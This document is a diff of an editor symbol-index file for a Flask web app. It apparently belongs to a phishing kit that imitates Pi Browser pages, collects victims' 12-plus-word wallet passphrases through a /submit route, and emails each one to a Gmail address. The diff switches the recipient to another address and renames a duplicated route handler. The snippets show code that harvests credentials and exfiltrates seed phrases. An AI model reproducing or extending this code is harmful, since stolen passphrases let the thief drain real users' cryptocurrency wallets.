@@ -52,7 +52,7 @@
         "kind": 2,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "def send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",\n            recipients=['dissangfrancis3@gmail.com']\n        )\n        msg.html = (",
+        "peekOfCode": "def send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",\n            recipients=['Servicepionner@gmail.com']\n        )\n        msg.html = (",
         "detail": "app",
         "documentation": {}
     },
@@ -61,7 +61,7 @@
         "kind": 2,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "def index():\n    return render_template('pi.html')\n@app.route('/main')\ndef menu():\n    return render_template('index.html')\n@app.route('/p2p')\ndef piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef piservice():",
+        "peekOfCode": "def index():\n    return render_template('pi.html')\n@app.route('/main')\ndef menu():\n    return render_template('index.html')\n@app.route('/p2p')\ndef piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef transactservice():",
         "detail": "app",
         "documentation": {}
     },
@@ -70,7 +70,7 @@
         "kind": 2,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "def menu():\n    return render_template('index.html')\n@app.route('/p2p')\ndef piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef piservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():",
+        "peekOfCode": "def menu():\n    return render_template('index.html')\n@app.route('/p2p')\ndef piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef transactservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():",
         "detail": "app",
         "documentation": {}
     },
@@ -79,16 +79,16 @@
         "kind": 2,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "def piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef piservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # Récupération des données JSON envoyées par le frontend\n    data = request.get_json()\n    passphrase = data.get('passphrase')",
+        "peekOfCode": "def piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef transactservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # Récupération des données JSON envoyées par le frontend\n    data = request.get_json()\n    passphrase = data.get('passphrase')",
         "detail": "app",
         "documentation": {}
     },
     {
-        "label": "piservice",
+        "label": "transactservice",
         "kind": 2,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "def piservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # Récupération des données JSON envoyées par le frontend\n    data = request.get_json()\n    passphrase = data.get('passphrase')\n    # Vérification de la validité de la passphrase\n    if not passphrase or len(passphrase.split()) < 12:\n        return jsonify({'error': 'PassPhrase invalide !'}), 400",
+        "peekOfCode": "def transactservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # Récupération des données JSON envoyées par le frontend\n    data = request.get_json()\n    passphrase = data.get('passphrase')\n    # Vérification de la validité de la passphrase\n    if not passphrase or len(passphrase.split()) < 12:\n        return jsonify({'error': 'PassPhrase invalide !'}), 400",
         "detail": "app",
         "documentation": {}
     },
@@ -160,7 +160,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "app.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",\n            recipients=['dissangfrancis3@gmail.com']",
+        "peekOfCode": "app.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",\n            recipients=['Servicepionner@gmail.com']",
         "detail": "app",
         "documentation": {}
     },
@@ -169,7 +169,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "mail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",\n            recipients=['dissangfrancis3@gmail.com']\n        )",
+        "peekOfCode": "mail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",\n            recipients=['Servicepionner@gmail.com']\n        )",
         "detail": "app",
         "documentation": {}
     }
